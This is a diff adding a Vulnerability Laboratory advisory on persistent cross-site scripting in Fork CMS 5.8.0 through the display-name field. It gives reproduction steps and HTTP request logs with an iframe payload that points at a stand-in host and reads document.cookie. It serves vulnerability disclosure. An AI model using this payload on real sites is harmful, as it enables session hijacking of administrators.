@@ -1,0 +1,491 @@
+# Title: Fork CMS 5.8.0 - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Vendor: https://www.fork-cms.com/download
+# Software Link: https://github.com/forkcms/forkcms/pull/3073
+# CVE: N/A
+
+Document Title:
+===============
+Fork CMS v5.8.0 - Multiple Persistent Web Vulnerbilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2208
+
+ID (3073):  https://github.com/forkcms/forkcms/pull/3073
+
+
+Release Date:
+=============
+2020-04-17
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2208
+
+
+Common Vulnerability Scoring System:
+====================================
+5.3
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Fork is an easy to use open source CMS using Symfony Components. Fork
+CMS is dedicated to creating a user friendly environment
+to build, monitor and
+update your website. We take great pride in being the Content Management
+System of choice for beginners and professionals.
+
+(Copy of the Homepage: https://www.fork-cms.com  &
+https://www.fork-cms.com/download )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+persistent web vulnerabilities in the official Fork CMS v5.8.0.
+
+
+Affected Product(s):
+====================
+ForkCMS
+Product: Fork CMS v5.8.0 - Content Management System (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-17: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted authentication (user/moderator) - User privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+Multiple persistent input validation web vulnerabilities has been
+discovered in the official Fork CMS v5.8.0 open-source web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser to
+web-application requests from the application-side.
+
+The persistent input validation web vulnerabilities are located in the
+`Displayname` input field when using the `Add`, `Edit` or `Register`
+mechanism that forwards the information into the `var` parameter. Remote
+attackers and privileged application user accounts are able to
+inject own malicious persistent script code as the users displayname by
+usage of the registration module (/profiles/register). Privileged
+users with access to the profile or users module are able to exploit the
+issue by a simple inject. The displayname then becomes visible in
+the Admin - Profiles Index on Preview, Edit User/Profile, Delete User
+Interaction and User Index in Listing modules. the var parameter
+does not encode or parse the exisiting injected content and executes it.
+The request method to inject is POST and the attack vector of the
+vulnerability is located on the application-side of the content
+management system. The injection point is located in the registration form
+and the add/edit user function. The execution point of the issue occurs
+in the preview profile, edit user, user index listing and delete
+user message context.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external redirects to
+malicious source and persistent manipulation of affected application
+modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Register
+[+] Add User
+[+] Edit User
+
+Vulnerable Input(s):
+[+] Displayname
+
+Vulnerable Parameter(s):
+[+] var
+
+Affected Module(s):
+[+] Preview Profile
+[+] Edit User
+[+] User Index
+[+] Delete User
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerabilities can be exploited by
+remote attackers with low privileged user account and low user interaction.
+For security demonstration or to reproduce the security vulnerability
+follow the provided information an steüs below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the fork cms web-application newst version
+2. Move via sitemap or by link to the registration page
+(/modules/profiles/register)
+3. Inject your script code payload html/js to the Displayname input field
+4. Register the account by pushing submit
+5. Activate the link in the account registration email
+Note: Now simple wait until the administrator / privileged user visits
+the panel to execute the code on interaction or preview only
+6. Successful reproduce of the persistent script code injection
+vulnerability!
+
+
+PoC: Vulnerable Source (User Index in Listing -
+https://fork-cms.localhost:8080/private/en/users/index)
+<tr id="row-2" class="even">
+<td class="nickname"><a
+href="/private/en/users/edit?token=k7byefqor8&id=2"
+title="edit">test3"><iframe src="evil.source"
+onload=alert(document.cookie)></a></td>
+<td  class="fork-data-grid-action actionEdit"><a
+href="/private/en/users/edit?token=k7byefqor8&id=2"
+class="btn btn-default btn-xs pull-right">
+<span class="fa fa-pencil" aria-hidden="true"></span>&nbsp;Edit</a></td>
+</tr>
+
+
+PoC: Vulnerable Source (Profiles Index on Preview -
+https://fork-cms.localhost:8080/private/en/profiles/index)
+<tbody><tr id="row-1" class="odd">
+<td class="check"><input type="checkbox" name="id[]" value="1"
+class="inputCheckbox checkBeforeUnload"></td>
+<td class="email"><a
+href="/private/en/profiles/edit?token=k7byefqor8&id=1"
+title="">tester23@protonmail.com</a></td>
+<td class="display_name">"<iframe src="evil.source"
+onload="alert(document.cookie)"></td>
+<td  class="registered_on">13 April 2020 11:17</td>
+<td  class="fork-data-grid-action actionEdit">
+<a href="/private/en/profiles/edit?token=k7byefqor8&id=1" class="btn
+btn-default btn-xs pull-right">
+<span class="fa fa-pencil" aria-hidden="true"></span>&nbsp;Edit</a></td>
+</tr></tbody>
+
+
+PoC: Vulnerable Source (Delete User - On Interaction)
+<form name="delete" method="post"
+action="/private/en/users/delete?token=k7byefqor8">
+<input type="hidden" id="delete__token" name="delete[_token]"
+value="q3ADogMObka_-73n5afnMPsJHj9ZAI_ch5uiabqDsqs" />
+<input type="hidden" id="delete_id" name="delete[id]" value="2" />
+<div class="modal fade" id="confirmDelete" role="dialog" tabindex="-1"
+aria-hidden="true" aria-labelledby="confirmDeleteTitle">
+<div class="modal-dialog"><div class="modal-content"><div
+class="modal-header">
+<h4 class="modal-title" id="confirmDeleteTitle">Delete</h4></div>
+<div class="modal-body">
+<p>Are your sure you want to delete the user "evil.source"><iframe
+src=evil.source onload=alert(document.cookie)>"?</p></div>
+<div class="modal-footer">
+<button class="btn btn-default" title="Cancel"  data-dismiss="modal">
+<span class="fa fa-times" aria-hidden="true"></span>
+<span class="btn-text">Cancel</span></button>
+<button class="btn btn-danger" title="Delete" >
+<span class="fa fa-trash" aria-hidden="true"></span>
+<span class="btn-text">Delete</span>
+</button></div></div></div></div>
+</form>
+
+
+--- PoC Session Logs [POST] (Registration User Account) ---
+https://fork-cms.localhost:8080/en/modules/profiles/register#registerForm
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://fork-cms.localhost:8080/en/modules/profiles/register
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 179
+Origin: https://fork-cms.localhost:8080
+Connection: keep-alive
+Cookie:
+track=s%3A32%3A%229739044e17a322bae65870698df9b79e%22%3B;PHPSESSID=dc1ffd3d01b2200d81b05cacb58e758d;
+
+interface_language=en; frontend_language=en; cookie_bar_agree=Y;
+cookie_bar_hide=Y;
+form=register&form_token=f1e7f2e9077b0400f5e97591ac09ef3e&display_name=>"<iframe
+src=evil.source
+onload=alert(document.cookie)>&email=tester23@protonmail.com&password=pwnd
+-
+POST: HTTP/1.1 302 Found
+Server: nginx/1.6.2
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: frontend_language=en; expires=Wed, 13-May-2020 09:49:57 GMT;
+Max-Age=2592000;
+path=/; domain=.fork-cms.localhost:8080; httponly; samesite=lax
+track=s%3A32%3A%229739044e17a322bae65870698df9b79e%22%3B; expires=Tue,
+13-Apr-2021 09:49:57 GMT;
+Max-Age=31536000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Location: https://fork-cms.localhost:8080
+X-server: fork01
+
+
+-- PoC Session Logs [POST] (Add User) ---
+https://fork-cms.localhost:8080/private/en/users/add?token=k7byefqor8
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer:
+https://fork-cms.localhost:8080/private/en/users/add?token=k7byefqor8
+Content-Type: multipart/form-data;
+boundary=---------------------------56051791419552543783889366402
+Content-Length: 2545
+Origin: https://fork-cms.localhost:8080
+Connection: keep-alive
+Cookie: PHPSESSID=dc1ffd3d01b2200d81b05cacb58e758d; interface_language=en
+Upgrade-Insecure-Requests: 1
+form=add&form_token=f1e7f2e9077b0400f5e97591ac09ef3e&email=tester232323@protonmail.com&password=tester445
+&confirm_password=tester445&name=test1&surname=test2&nickname=test3>"<iframe
+src=a onload=alert(document.cookie)>&avatar=
+&interface_language=en&preferred_editor=ck-editor&date_format=j F
+Y&time_format=H:i&number_format=dot_nothing
+&csv_split_character=;&csv_line_ending=n&active=1&groups[]=1&add=
+-
+POST: HTTP/1.1 302 Found
+Server: nginx/1.6.2
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: interface_language=en; expires=Wed, 13-May-2020 08:44:47
+GMT; Max-Age=2592000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Location:
+/private/en/users/index?token=k7byefqor8&report=added&var=test3>"<iframe
+src=evil.source onload=alert(document.cookie)>&highlight=row-4
+X-server: fork01
+-
+https://fork-cms.localhost:8080/private/en/users/index?token=k7byefqor8&report=added&var=test3>"<iframe
+src=evil.source onload=alert(document.cookie)>&highlight=row-4
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer:
+https://fork-cms.localhost:8080/private/en/users/add?token=k7byefqor8
+Connection: keep-alive
+Cookie: PHPSESSID=dc1ffd3d01b2200d81b05cacb58e758d; interface_language=en
+-
+POST: HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3615
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: interface_language=en; expires=Wed, 13-May-2020 08:44:47
+GMT; Max-Age=2592000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Vary: Accept-Encoding
+Content-Encoding: gzip
+X-server: fork01
+-
+GET: HTTP/1.1 200 OK
+Server: nginx/1.6.2
+https://fork-cms.localhost:8080/private/en/users/evil.source
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: interface_language=en; expires=Wed, 13-May-2020 08:44:47
+GMT; Max-Age=2592000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Location: /private/en/error?type=action-not-allowed
+X-server: fork01
+
+
+-- PoC Session Logs [POST] (Edit User) ---
+https://fork-cms.localhost:8080/private/en/users/edit?token=k7byefqor8&id=2
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer:
+https://fork-cms.localhost:8080/private/en/users/edit?token=k7byefqor8&id=2
+Content-Type: multipart/form-data;
+boundary=---------------------------388544425912514902093103180709
+Content-Length: 2563
+Origin: https://fork-cms.localhost:8080
+Connection: keep-alive
+Cookie: PHPSESSID=dc1ffd3d01b2200d81b05cacb58e758d; interface_language=en
+form=edit&form_token=f1e7f2e9077b0400f5e97591ac09ef3e&email=testemail337@protonmail.com&name=test1&surname=test2
+&nickname=test3>"<iframe src=evil.source
+onload=alert(document.cookie)>&avatar=&new_password=&confirm_password=
+&interface_language=en&preferred_editor=ck-editor&date_format=j F
+Y&time_format=H:i&number_format=dot_nothing&
+csv_split_character=;&csv_line_ending=n&active=1&groups[]=1&edit=
+-
+POST: HTTP/1.1 302 Found
+Server: nginx/1.6.2
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: interface_language=en; expires=Wed, 13-May-2020 08:34:55
+GMT; Max-Age=2592000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Location:
+/private/en/users/index?token=k7byefqor8&report=edited&var=test3>"<iframe src=evil.source
+onload=alert(document.cookie)>&highlight=row-2
+X-server: fork01
+https://fork-cms.localhost:8080/private/en/users/index?token=k7byefqor8&report=edited&var=test3>"<iframe
+src=evil.source onload=alert(document.cookie)>&highlight=row-2
+Host: fork-cms.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer:
+https://fork-cms.localhost:8080/private/en/users/edit?token=k7byefqor8&id=2
+Connection: keep-alive
+Cookie: PHPSESSID=dc1ffd3d01b2200d81b05cacb58e758d; interface_language=en
+-
+POST: HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Content-Type: text/html; charset=UTF-8
+Content-Length: 3585
+Connection: keep-alive
+Cache-Control: max-age=0, must-revalidate, private
+Set-Cookie: interface_language=en; expires=Wed, 13-May-2020 08:34:55 GMT;
+Max-Age=2592000; path=/; domain=.fork-cms.localhost:8080; httponly;
+samesite=lax
+Vary: Accept-Encoding
+Content-Encoding: gzip
+X-server: fork01
+
+
+Reference(s):
+https://fork-cms.localhost:8080/en/modules/profiles/register
+https://fork-cms.localhost:8080/private/en/profiles/index
+https://fork-cms.localhost:8080/private/en/users/index
+https://fork-cms.localhost:8080/private/en/users/edit
+https://fork-cms.localhost:8080/private/en/users/add
+
+
+Security Risk:
+==============
+The security risk of the persistent input validation web vulnerabilities
+in the fork cms web-application is estimated as high.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
